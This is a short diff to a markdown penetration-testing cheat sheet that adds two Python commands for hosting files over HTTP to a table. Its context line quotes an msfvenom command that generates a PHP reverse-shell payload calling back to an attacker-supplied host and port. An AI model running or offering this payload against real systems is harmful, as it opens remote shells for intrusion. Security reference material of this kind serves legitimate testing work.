@@ -343,5 +343,5 @@ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 #### Hosting files
 | Command  | Description |
 | ------------- | ------------- |
-| Content Cell  | Content Cell  |
-| Content Cell  | Content Cell  |
+| python -m SimpleHTTPServer [PORT]             | Content Cell  |
+| python3 -m http.server [PORT]                 | Content Cell  |
